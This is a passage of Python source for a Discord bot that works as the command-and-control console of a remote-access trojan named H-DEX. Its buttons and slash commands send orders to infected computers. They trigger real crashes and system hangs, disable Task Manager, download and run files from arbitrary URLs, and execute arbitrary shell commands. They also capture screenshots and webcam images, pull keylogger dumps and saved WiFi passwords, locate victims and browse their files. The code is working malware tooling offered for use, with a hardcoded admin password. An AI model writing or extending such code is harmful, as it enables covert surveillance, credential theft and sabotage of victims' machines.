    @discord.ui.button(label="Unblock Input", emoji="✅", style=discord.ButtonStyle.success, row=3)
    async def unblock_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "unblock_input_enhanced", msg="✅ Input UNBLOCKED!")

    @discord.ui.button(label="Hide Icons", emoji="👻", style=discord.ButtonStyle.secondary, row=3)
    async def hideicons_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "hide_icons", msg="👻 Desktop icons hidden!")

    @discord.ui.button(label="Show Icons", emoji="🖼️", style=discord.ButtonStyle.secondary, row=3)
    async def showicons_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "show_icons", msg="🖼️ Desktop icons restored!")

    @discord.ui.button(label="🚨 DANGER MODE", emoji="☠️", style=discord.ButtonStyle.danger, row=4)
    async def danger_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "start_danger", msg="🚨 **DANGER MODE ACTIVATED** — Lockdown + Jumpscares + Recovery Game!")


# ─── ADVANCED PANEL ───────────────────────────────────────────────────────────

class AdvancedPanel(BasePanel):
    """Advanced: UAC bypass, USB spread, defender, network"""
    def __init__(self, device_id, user_id, category):
        super().__init__(device_id, user_id, category)

    @discord.ui.button(label="Disable TaskMgr", emoji="🚫", style=discord.ButtonStyle.danger, row=1)
    async def distask_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "disable_taskmgr", msg="🚫 Task Manager disabled!")

    @discord.ui.button(label="Enable TaskMgr", emoji="✅", style=discord.ButtonStyle.success, row=1)
    async def entask_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "enable_taskmgr", msg="✅ Task Manager enabled!")

    @discord.ui.button(label="Real BSOD ☠️", emoji="💥", style=discord.ButtonStyle.danger, row=2)
    async def bsod_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "bsod", msg="☠️ **REAL BSOD TRIGGERED** — Device will crash!")

    @discord.ui.button(label="Hang System", emoji="🔥", style=discord.ButtonStyle.danger, row=3)
    async def hang_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "hang_system", msg="🔥 CPU stress hang initiated!")

    @discord.ui.button(label="Empty Recycle", emoji="🗑️", style=discord.ButtonStyle.secondary, row=3)
    async def recycle_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "empty_recycle", msg="🗑️ Recycle bin emptied!")

    @discord.ui.button(label="Self Destruct", emoji="💣", style=discord.ButtonStyle.danger, row=4)
    async def selfdestruct_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await self._send_cmd(interaction, "self_destruct", msg="💣 **SELF DESTRUCT TRIGGERED** — All traces being removed!")

    @discord.ui.button(label="Download & Run", emoji="⬇️", style=discord.ButtonStyle.primary, row=4)
    async def download_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(DownloadModal(self.device_id))

    @discord.ui.button(label="Wallpaper", emoji="🖼️", style=discord.ButtonStyle.secondary, row=4)
    async def wallpaper_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(WallpaperModal(self.device_id))




class DownloadModal(discord.ui.Modal, title="⬇️ Download & Execute"):
    url_input = discord.ui.TextInput(label="File URL", placeholder="https://example.com/file.exe", required=True)
    filename_input = discord.ui.TextInput(label="Save as (optional)", placeholder="update.exe", required=False)

    def __init__(self, device_id: str):
        super().__init__()
        self.device_id = device_id

    async def on_submit(self, interaction: discord.Interaction):
        await send_to_server({
            "type": "download_execute", "target_id": self.device_id,
            "url": self.url_input.value, "filename": self.filename_input.value or None
        })
        embed = create_embed("⬇️ Download & Execute", f"Downloading: `{self.url_input.value[:60]}...`", color=0xFF6600)
        await interaction.response.send_message(embed=embed, ephemeral=True)


class WallpaperModal(discord.ui.Modal, title="🖼️ Set Wallpaper"):
    url_input = discord.ui.TextInput(label="Image URL", placeholder="https://example.com/image.jpg", required=True)

    def __init__(self, device_id: str):
        super().__init__()
        self.device_id = device_id

    async def on_submit(self, interaction: discord.Interaction):
        await send_to_server({"type": "set_wallpaper", "target_id": self.device_id, "path": self.url_input.value})
        await interaction.response.send_message("🖼️ Wallpaper change sent!", ephemeral=True)


# ─── LEGACY COMPAT ────────────────────────────────────────────────────────────

class DeviceActionsView(discord.ui.View):
    """Device selection callback view — opens the panel system"""
    def __init__(self, device_id: str, user_id: int):
        super().__init__(timeout=600)
        self.device_id = device_id
        self.user_id = user_id
        self.add_item(CategoryDropdown(device_id, user_id, current="system"))


class DashboardView(discord.ui.View):
    """Main dashboard view"""
    def __init__(self, user_id: int):
        super().__init__(timeout=300)
        self.user_id = user_id
        
        # Filter out banned devices
        visible_devices = {k:v for k,v in bot.devices.items() if k not in bot.banned_devices}
        
        if visible_devices:
            self.add_item(DeviceSelectDropdown(visible_devices, user_id))

    @discord.ui.button(label="Refresh", emoji="🔄", style=discord.ButtonStyle.secondary, row=1)
    async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = get_status_embed()
        
        # Device list
        if bot.devices:
            device_text = ""
            for dev_id, dev in list(bot.devices.items())[:10]:
                device_text += f"🟢 **{dev.get('name', 'Unknown')}** - `{dev.get('ip', '?')}`\n"
            embed.add_field(name="📱 Connected Devices", value=device_text or "No devices", inline=False)
        
        # Update the view with new devices
        new_view = DashboardView(self.user_id)
        await interaction.response.edit_message(embed=embed, view=new_view)

    @discord.ui.button(label="Disconnect", emoji="🔌", style=discord.ButtonStyle.danger, row=1)
    async def disconnect_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await disconnect_from_server()
        embed = create_embed("🔌 Disconnected", "Disconnected from H-DEX server.", color=0xFF4136)
        await interaction.response.edit_message(embed=embed, view=None)


class PasswordModal(discord.ui.Modal, title="Authentication Required"):
    password = discord.ui.TextInput(
        label="Password", 
        placeholder="Enter admin password to enable device",
        style=discord.TextStyle.short, 
        required=True
    )
    
    def __init__(self, device_id):
        super().__init__()
        self.device_id = device_id
        
    async def on_submit(self, interaction: discord.Interaction):
        if self.password.value == "nela001":
            if self.device_id in bot.banned_devices:
                bot.banned_devices.remove(self.device_id)
                save_bans(bot.banned_devices)
                await interaction.response.send_message(f"✅ Device **{self.device_id}** enabled/restored.", ephemeral=True)
            else:
                 await interaction.response.send_message(f"⚠️ Device **{self.device_id}** is not disabled.", ephemeral=True)
        else:
            await interaction.response.send_message(f"❌ Incorrect Password!", ephemeral=True)


class SpeakModal(discord.ui.Modal, title="Text to Speech"):
    """Modal for TTS input"""
    text = discord.ui.TextInput(
        label="Text to speak",
        placeholder="Enter text to speak on the device...",
        max_length=500
    )
    
    def __init__(self, device_id: str):
        super().__init__()
        self.device_id = device_id
    
    async def on_submit(self, interaction: discord.Interaction):
        await send_to_server({
            "type": "speak",
            "target_id": self.device_id,
            "text": self.text.value
        })
        await interaction.response.send_message(f"🔊 Speaking: `{self.text.value}`", ephemeral=True)


class MessageModal(discord.ui.Modal, title="Send Message"):
    """Modal for sending a message popup"""
    msg_title = discord.ui.TextInput(label="Title", placeholder="Message title...", max_length=100)
    msg_text = discord.ui.TextInput(label="Message", placeholder="Message body...", max_length=500, style=discord.TextStyle.paragraph)
    
    def __init__(self, device_id: str):
        super().__init__()
        self.device_id = device_id
    
    async def on_submit(self, interaction: discord.Interaction):
        await send_to_server({
            "type": "show_message",
            "target_id": self.device_id,
            "title": self.msg_title.value,
            "message": self.msg_text.value
        })
        await interaction.response.send_message(f"💬 Message sent: **{self.msg_title.value}**", ephemeral=True)





# ═══════════════════════════════════════════════════════════════════════════════
# SLASH COMMANDS - /dex group
# ═══════════════════════════════════════════════════════════════════════════════

dex_group = app_commands.Group(name="dex", description="H-DEX Control Commands")
bot.tree.add_command(dex_group)

@dex_group.command(name="ping", description="Check bot and server latency")
async def dex_ping(interaction: discord.Interaction):
    """Check bot latency and server response time"""
    start_time = time.time()
    
    # Bot latency
    bot_latency = round(bot.latency * 1000)
    
    # Server latency (if connected)
    server_latency = "N/A"
    if bot.connected and bot.websocket:
        try:
            ws_start = time.time()
            await bot.websocket.ping()
            server_latency = f"{round((time.time() - ws_start) * 1000)}ms"
        except:
            server_latency = "Error"
    
    embed = create_embed("🏓 Pong!", color=Colors.SUCCESS)
    embed.add_field(name="🤖 Bot Latency", value=f"`{bot_latency}ms`", inline=True)
    embed.add_field(name="🔗 Server Latency", value=f"`{server_latency}`", inline=True)
    embed.add_field(name="📡 Status", value="🟢 Connected" if bot.connected else "🔴 Disconnected", inline=True)
    
    await interaction.response.send_message(embed=embed)


@dex_group.command(name="uptime", description="Show bot uptime and statistics")
async def dex_uptime(interaction: discord.Interaction):
    """Show bot uptime and performance statistics"""
    embed = create_embed("⏱️ Bot Uptime", color=Colors.INFO)
    embed.add_field(name="🕒 Uptime", value=f"`{get_uptime_str()}`", inline=True)
    embed.add_field(name="💻 Started", value=f"<t:{int(bot.start_time.timestamp())}:R>", inline=True)
    embed.add_field(name="📡 Connection", value="🟢 Online" if bot.connected else "🔴 Offline", inline=True)
    embed.add_field(name="📱 Devices", value=f"`{len(bot.devices)}`", inline=True)
    embed.add_field(name="📝 Commands", value=f"`{len(bot.command_history)}`", inline=True)
    embed.add_field(name="🔄 Reconnects", value=f"`{bot.reconnect_attempts}`", inline=True)
    
    await interaction.response.send_message(embed=embed)


@dex_group.command(name="stats", description="Show detailed server and bot statistics")
async def dex_stats(interaction: discord.Interaction):
    """Show detailed statistics"""
    embed = create_embed("📊 H-DEX Statistics", color=Colors.PRIMARY)
    
    # Bot stats
    embed.add_field(
        name="🤖 Bot Info",
        value=f"**Uptime:** {get_uptime_str()}\n"
              f"**Latency:** {round(bot.latency * 1000)}ms\n"
              f"**Guilds:** {len(bot.guilds)}",
        inline=True
    )
    
    # Connection stats
    embed.add_field(
        name="🔗 Connection",
        value=f"**Status:** {'Online' if bot.connected else 'Offline'}\n"
              f"**Devices:** {len(bot.devices)}\n"
              f"**Groups:** {len(bot.device_groups)}",
        inline=True
    )
    
    # Server info
    embed.add_field(
        name="🖥️ Server",
        value=f"**URI:** `{bot.server_uri[:30]}...`\n"
              f"**Reconnects:** {bot.reconnect_attempts}\n"
              f"**Commands:** {len(bot.command_history)}",
        inline=True
    )
    
    await interaction.response.send_message(embed=embed)


@dex_group.command(name="connect", description="Connect to H-DEX server")
async def dex_connect(interaction: discord.Interaction):
    if bot.connected:
        await interaction.response.send_message("⚠️ Already connected! Use `/dex disconnect` first.", ephemeral=True)
        return
    
    await interaction.response.defer(thinking=True)
    
    success = await connect_to_server()
    
    if success:
        embed = create_embed("✅ Connected", f"Successfully connected to H-DEX server!", color=Colors.SUCCESS)
        embed.add_field(name="Server", value=f"`{bot.server_uri}`", inline=False)
        await interaction.followup.send(embed=embed)
    else:
        embed = create_embed("❌ Connection Failed", "Could not connect to the server. Check the URL.", color=Colors.DANGER)
        await interaction.followup.send(embed=embed)


@dex_group.command(name="disconnect", description="Disconnect from H-DEX server")
async def dex_disconnect(interaction: discord.Interaction):
    if not bot.connected:
        await interaction.response.send_message("⚠️ Not connected!", ephemeral=True)
        return
    
    await disconnect_from_server()
    
    embed = create_embed("🔌 Disconnected", "Disconnected from H-DEX server. Power save mode active.", color=Colors.DANGER)
    await interaction.response.send_message(embed=embed)


@dex_group.command(name="server", description="Show server status")
async def dex_server(interaction: discord.Interaction):
    embed = get_status_embed()
    
    if bot.connected and bot.devices:
        device_text = ""
        for dev_id, dev in list(bot.devices.items())[:10]:
            selected = "📌" if bot.selected_device.get(interaction.user.id) == dev_id else "🟢"
            device_text += f"{selected} **{dev.get('name', 'Unknown')}** - `{dev.get('ip', '?')}`\n"
        embed.add_field(name="📱 Connected Devices", value=device_text or "No devices", inline=False)
    
    await interaction.response.send_message(embed=embed)


@dex_group.command(name="list", description="List connected devices")
async def dex_list(interaction: discord.Interaction):
    if not bot.connected:
        await interaction.response.send_message("❌ Not connected! Use `/dex connect` first.", ephemeral=True)
        return
    
    # Filter banned devices
    visible_devices = {k:v for k,v in bot.devices.items() if k not in bot.banned_devices}
    
    if not visible_devices:
        embed = create_embed("📱 No Devices", "No active devices connected (some may be disabled).", color=0xFFD700)
        await interaction.response.send_message(embed=embed)
        return
    
    embed = create_embed("📱 Connected Devices", f"**{len(visible_devices)} device(s) online**")
    
    for i, (dev_id, dev) in enumerate(visible_devices.items()):
        selected = "📌" if bot.selected_device.get(interaction.user.id) == dev_id else ""
        embed.add_field(
            name=f"{'📌 ' if selected else '🖥️ '}{dev.get('name', 'Unknown')}",
            value=f"**IP:** {dev.get('ip', 'Unknown')}\n**ID:** `{dev_id[:20]}...`",
            inline=True
        )
        if i >= 8:  # Limit to 9 devices in embed
            embed.add_field(name="...", value=f"And {len(visible_devices) - 9} more", inline=False)
            break
    
    view = DashboardView(interaction.user.id)
    await interaction.response.send_message(embed=embed, view=view)


# ═══════════════════════════════════════════════════════════════════════════════
# BAN MANAGEMENT (DISABLE/ENABLE)
# ═══════════════════════════════════════════════════════════════════════════════

# Create ban subgroup: /dex ban ...
ban_group = app_commands.Group(name="ban", description="Manage disabled/hidden devices")
dex_group.add_command(ban_group)

@dex_group.command(name="disable", description="Disable (hide) a device from the list")
@app_commands.describe(device_id="ID of the device to disable")
async def dex_disable(interaction: discord.Interaction, device_id: str):
    """Hide a device from /dex list and dashboard"""
    if device_id in bot.banned_devices:
        await interaction.response.send_message("⚠️ Device is already disabled!", ephemeral=True)
        return
        
    bot.banned_devices.add(device_id)
    save_bans(bot.banned_devices)
    
    # Deselect if selected
    for uid, selected in list(bot.selected_device.items()):
        if selected == device_id:
            bot.selected_device.pop(uid)
            
    # Try to get name for better feedback
    dev_name = bot.devices.get(device_id, {}).get('name', 'Unknown Device')
    await interaction.response.send_message(f"🚫 Device **{dev_name}** (`{device_id}`) has been disabled and hidden.", ephemeral=True)


@dex_group.command(name="enable", description="Enable (unhide) a disabled device (Requires Password)")
@app_commands.describe(device_id="ID of the device to enable")
async def dex_enable(interaction: discord.Interaction, device_id: str):
    """Show password prompt to enable a device"""
    if device_id not in bot.banned_devices:
         await interaction.response.send_message("⚠️ Device is not in the disable/ban list.", ephemeral=True)
         return
         
    modal = PasswordModal(device_id)
    await interaction.response.send_modal(modal)


@ban_group.command(name="list", description="Show list of all disabled/hidden devices")
async def ban_list(interaction: discord.Interaction):
    """Show all devices currently in the ban list"""
    if not bot.banned_devices:
        await interaction.response.send_message("✅ No devices are currently disabled.", ephemeral=True)
        return
        
    embed = create_embed("🚫 Disabled Devices", f"**{len(bot.banned_devices)}** devices currently hidden", color=Colors.DANGER)
    
    list_text = ""
    for bid in bot.banned_devices:
        # Try to find name if still connected (even if hidden)
        dev = bot.devices.get(bid)
        name = dev.get('name', 'Offline/Unknown') if dev else "Offline"
        list_text += f"• `{bid}` ({name})\n"
        
    embed.description = list_text[:4000]
    await interaction.response.send_message(embed=embed)


@dex_group.command(name="set", description="Set device or URL")
@app_commands.describe(
    option="What to set (url or device ID)",
    value="The URL or device ID"
)
async def dex_set(interaction: discord.Interaction, option: str, value: str):
    if option.lower() == "url":
        # Set server URL
        if not value.startswith("ws://") and not value.startswith("wss://"):
            await interaction.response.send_message("❌ URL must start with `ws://` or `wss://`", ephemeral=True)
            return
        
        bot.server_uri = value
        config['server_uri'] = value
        save_config(config)
        
        embed = create_embed("✅ URL Updated", f"Server URL set to:\n`{value}`", color=0x00FF7F)
        embed.add_field(name="Note", value="Use `/dex connect` to connect with the new URL.", inline=False)
        await interaction.response.send_message(embed=embed)
    else:
        # Set device
        if not bot.connected:
            await interaction.response.send_message("❌ Not connected! Use `/dex connect` first.", ephemeral=True)
            return
        
        # Find device by partial match
        device_id = None
        for dev_id in bot.devices:
            if value.lower() in dev_id.lower() or value.lower() in bot.devices[dev_id].get('name', '').lower():
                device_id = dev_id
                break
        
        if not device_id:
            await interaction.response.send_message(f"❌ Device `{value}` not found!", ephemeral=True)
            return
        
        bot.selected_device[interaction.user.id] = device_id
        device = bot.devices[device_id]
        
        embed = create_embed(
            "✅ Device Selected",
            f"**{device.get('name', 'Unknown')}** is now your active device.",
            color=0x00FF7F
        )
        embed.add_field(name="ID", value=f"`{device_id}`", inline=True)
        embed.add_field(name="IP", value=device.get('ip', 'Unknown'), inline=True)
        
        view = DeviceActionsView(device_id, interaction.user.id)
        await interaction.response.send_message(embed=embed, view=view)


@dex_group.command(name="dashboard", description="Open interactive dashboard")
async def dex_dashboard(interaction: discord.Interaction):
    if not bot.connected:
        await interaction.response.send_message("❌ Not connected! Use `/dex connect` first.", ephemeral=True)
        return
    
    embed = create_embed("🎛️ H-DEX Dashboard", "Select a device to control from the dropdown below.")
    embed.add_field(name="Status", value="🟢 Connected" if bot.connected else "🔴 Disconnected", inline=True)
    embed.add_field(name="Devices", value=str(len(bot.devices)), inline=True)
    
    selected_id = bot.selected_device.get(interaction.user.id)
    if selected_id and selected_id in bot.devices:
        device = bot.devices[selected_id]
        embed.add_field(name="📌 Selected Device", value=f"**{device.get('name', 'Unknown')}** (`{device.get('ip', '?')}`)", inline=False)
    
    view = DashboardView(interaction.user.id)
    await interaction.response.send_message(embed=embed, view=view)


# ═══════════════════════════════════════════════════════════════════════════════
# QUICK COMMANDS (work on selected device)
# ═══════════════════════════════════════════════════════════════════════════════

@bot.tree.command(name="screenshot", description="Take screenshot of selected device")
async def cmd_screenshot(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await interaction.response.defer(thinking=True)
    
    future = asyncio.get_event_loop().create_future()
    bot.pending_responses[f"screenshot_{device_id}"] = future
    
    await send_to_server({
        "type": "take_screenshot",
        "target_id": device_id
    })
    
    try:
        # Wait for the single frame response
        b64_data = await asyncio.wait_for(future, timeout=15)
        # Atomic command, no need to stop stream
        
        img_data = base64.b64decode(b64_data)
        file = discord.File(io.BytesIO(img_data), filename="screenshot.png")
        
        embed = create_embed("📷 Screenshot", f"Device: **{bot.devices.get(device_id, {}).get('name', 'Unknown')}**")
        embed.set_image(url="attachment://screenshot.png")
        
        await interaction.followup.send(embed=embed, file=file)
    except asyncio.TimeoutError:
        await interaction.followup.send("❌ Screenshot timed out!", ephemeral=True)


@bot.tree.command(name="lock", description="Lock selected device")
async def cmd_lock(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "execute_command",
        "target_id": device_id,
        "command": "rundll32.exe user32.dll,LockWorkStation"
    })
    
    embed = create_embed("🔒 PC Locked", f"Locked **{bot.devices.get(device_id, {}).get('name', 'Unknown')}**", color=0x00FF7F)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="shutdown", description="Shutdown selected device")
async def cmd_shutdown(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "execute_command",
        "target_id": device_id,
        "command": "shutdown /s /t 0"
    })
    
    embed = create_embed("Shutdown", f"Shutdown command sent to **{bot.devices.get(device_id, {}).get('name', 'Unknown')}**", color=0xFF4136)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="restart", description="Restart selected device")
async def cmd_restart(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "execute_command",
        "target_id": device_id,
        "command": "shutdown /r /t 0"
    })
    
    embed = create_embed("🔄 Restart", f"Restart command sent to **{bot.devices.get(device_id, {}).get('name', 'Unknown')}**", color=0xFFD700)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="terminal", description="Execute command on selected device")
@app_commands.describe(command="Command to execute")
async def cmd_terminal(interaction: discord.Interaction, command: str):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await interaction.response.defer(thinking=True)
    
    future = asyncio.get_event_loop().create_future()
    bot.pending_responses[f"terminal_{device_id}"] = future
    
    await send_to_server({
        "type": "execute_command",
        "target_id": device_id,
        "command": command
    })
    
    try:
        output = await asyncio.wait_for(future, timeout=30)
        
        embed = create_embed("💻 Terminal", f"**Command:** `{command}`")
        
        if len(output) > 1000:
            output = output[:1000] + "\n... (truncated)"
        
        embed.add_field(name="Output", value=f"```\n{output or 'No output'}\n```", inline=False)
        await interaction.followup.send(embed=embed)
    except asyncio.TimeoutError:
        await interaction.followup.send("❌ Command timed out!", ephemeral=True)


@bot.tree.command(name="speak", description="Text-to-speech on selected device")
@app_commands.describe(text="Text to speak")
async def cmd_speak(interaction: discord.Interaction, text: str):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "speak",
        "target_id": device_id,
        "text": text
    })
    
    embed = create_embed("🔊 Speaking", f"**Text:** {text}", color=0x00FF7F)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="message", description="Show message popup on selected device")
@app_commands.describe(title="Message title", text="Message body")
async def cmd_message(interaction: discord.Interaction, title: str, text: str):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "show_message",
        "target_id": device_id,
        "title": title,
        "message": text
    })
    
    embed = create_embed("💬 Message Sent", f"**Title:** {title}\n**Body:** {text}", color=0x00FF7F)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="wallpaper", description="Set desktop wallpaper on selected device")
@app_commands.describe(url="Direct URL to the image to set as wallpaper")
async def cmd_wallpaper(interaction: discord.Interaction, url: str):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await interaction.response.defer(thinking=True)
    
    try:
        # Download image and convert to b64 to send to client
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            b64_data = base64.b64encode(response.content).decode('utf-8')
            await send_to_server({
                "type": "set_wallpaper_b64",
                "target_id": device_id,
                "data": b64_data
            })
            embed = create_embed("🖼️ Wallpaper Updated", f"Updating wallpaper from `{url[:60]}...`", color=0x00FF7F)
            await interaction.followup.send(embed=embed)
        else:
            await interaction.followup.send(f"❌ Failed to download image (Status: {response.status_code})", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)


@bot.tree.command(name="url", description="Open URL on selected device")
@app_commands.describe(url="URL to open")
async def cmd_url(interaction: discord.Interaction, url: str):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "open_url",
        "target_id": device_id,
        "url": url
    })
    
    embed = create_embed("🌐 URL Opened", f"Opening `{url}` on device", color=0x00FF7F)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="sysinfo", description="Get system info of selected device")
async def cmd_sysinfo(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await interaction.response.defer(thinking=True)
    
    future = asyncio.get_event_loop().create_future()
    bot.pending_responses[f"sysinfo_{device_id}"] = future
    
    await send_to_server({
        "type": "get_sys_info",
        "target_id": device_id
    })
    
    try:
        data = await asyncio.wait_for(future, timeout=10)
        
        embed = create_embed("📊 System Information", f"**{bot.devices.get(device_id, {}).get('name', 'Unknown')}**")
        embed.add_field(name="💻 Hostname", value=data.get('hostname', 'Unknown'), inline=True)
        embed.add_field(name="🖥️ OS", value=f"{data.get('os', 'Unknown')} {data.get('version', '')}", inline=True)
        embed.add_field(name="📐 Architecture", value=data.get('architecture', 'Unknown'), inline=True)
        embed.add_field(name="⚙️ Processor", value=data.get('processor', 'Unknown')[:100], inline=False)
        
        ram = data.get('ram', {})
        embed.add_field(name="🧠 RAM", value=f"Used: {ram.get('used', '?')} / {ram.get('total', '?')} ({ram.get('percent', 0)}%)", inline=False)
        
        await interaction.followup.send(embed=embed)
    except asyncio.TimeoutError:
        await interaction.followup.send("❌ Request timed out!", ephemeral=True)


@bot.tree.command(name="location", description="Get location of selected device")
async def cmd_location(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await interaction.response.defer(thinking=True)
    
    future = asyncio.get_event_loop().create_future()
    bot.pending_responses[f"location_{device_id}"] = future
    
    await send_to_server({
        "type": "get_location",
        "target_id": device_id
    })
    
    try:
        data = await asyncio.wait_for(future, timeout=10)
        
        embed = create_embed("📍 Device Location", f"**{bot.devices.get(device_id, {}).get('name', 'Unknown')}**")
        embed.add_field(name="🌐 IP", value=data.get('query', 'Unknown'), inline=True)
        embed.add_field(name="🏙️ City", value=data.get('city', 'Unknown'), inline=True)
        embed.add_field(name="🗺️ Region", value=data.get('regionName', 'Unknown'), inline=True)
        embed.add_field(name="🌍 Country", value=data.get('country', 'Unknown'), inline=True)
        embed.add_field(name="📡 ISP", value=data.get('isp', 'Unknown'), inline=False)
        
        lat, lon = data.get('lat'), data.get('lon')
        if lat and lon:
            embed.add_field(name="📌 Coordinates", value=f"`{lat}, {lon}`", inline=True)
            embed.add_field(name="🗺️ Maps", value=f"[Open in Google Maps](https://www.google.com/maps/search/?api=1&query={lat},{lon})", inline=True)
        
        await interaction.followup.send(embed=embed)
    except asyncio.TimeoutError:
        await interaction.followup.send("❌ Request timed out!", ephemeral=True)


@bot.tree.command(name="files", description="Browse files on selected device")
@app_commands.describe(path="Path to browse (default: current directory)")
async def cmd_files(interaction: discord.Interaction, path: Optional[str] = "."):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await interaction.response.defer(thinking=True)
    
    future = asyncio.get_event_loop().create_future()
    bot.pending_responses[f"files_{device_id}"] = future
    
    await send_to_server({
        "type": "list_dir",
        "target_id": device_id,
        "path": path
    })
    
    try:
        data = await asyncio.wait_for(future, timeout=10)
        items = data.get('items', [])
        current_path = data.get('path', path)
        
        embed = create_embed("📁 File Browser", f"**Path:** `{current_path}`")
        
        dirs = [i for i in items if i.get('is_dir')]
        files = [i for i in items if not i.get('is_dir')]
        
        if dirs:
            dir_list = "\n".join([f"📁 {d['name']}" for d in dirs[:15]])
            if len(dirs) > 15:
                dir_list += f"\n... and {len(dirs) - 15} more"
            embed.add_field(name=f"Folders ({len(dirs)})", value=dir_list or "None", inline=False)
        
        if files:
            file_list = "\n".join([f"📄 {f['name']}" for f in files[:15]])
            if len(files) > 15:
                file_list += f"\n... and {len(files) - 15} more"
            embed.add_field(name=f"Files ({len(files)})", value=file_list or "None", inline=False)
        
        await interaction.followup.send(embed=embed)
    except asyncio.TimeoutError:
        await interaction.followup.send("❌ Request timed out!", ephemeral=True)





# ═══════════════════════════════════════════════════════════════════════════════
# ADDITIONAL COMMANDS
# ═══════════════════════════════════════════════════════════════════════════════

@bot.tree.command(name="webcam", description="Take webcam snapshot from selected device")
async def cmd_webcam(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await interaction.response.defer(thinking=True)
    
    future = asyncio.get_event_loop().create_future()
    bot.pending_responses[f"webcam_{device_id}"] = future
    
    await send_to_server({
        "type": "start_webcam_stream",
        "target_id": device_id
    })
    
    try:
        b64_data = await asyncio.wait_for(future, timeout=15)
        
        await send_to_server({
            "type": "stop_webcam_stream",
            "target_id": device_id
        })
        
        img_data = base64.b64decode(b64_data)
        file = discord.File(io.BytesIO(img_data), filename="webcam.png")
        
        embed = create_embed("📷 Webcam Snapshot", f"Device: **{bot.devices.get(device_id, {}).get('name', 'Unknown')}**")
        embed.set_image(url="attachment://webcam.png")
        
        await interaction.followup.send(embed=embed, file=file)
    except asyncio.TimeoutError:
        await interaction.followup.send("❌ Webcam snapshot timed out! Device may not have a webcam.", ephemeral=True)


@bot.tree.command(name="keylog", description="Get keylogger data from selected device")
async def cmd_keylog(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "get_keylog_dump",
        "target_id": device_id
    })
    
    embed = create_embed("🔑 Keylogger", "Requested keylog data. Check if you receive any logs.", color=0xFFD700)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="wifi", description="Get saved WiFi passwords from selected device")
async def cmd_wifi(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    await send_to_server({
        "type": "get_wifi",
        "target_id": device_id
    })
    
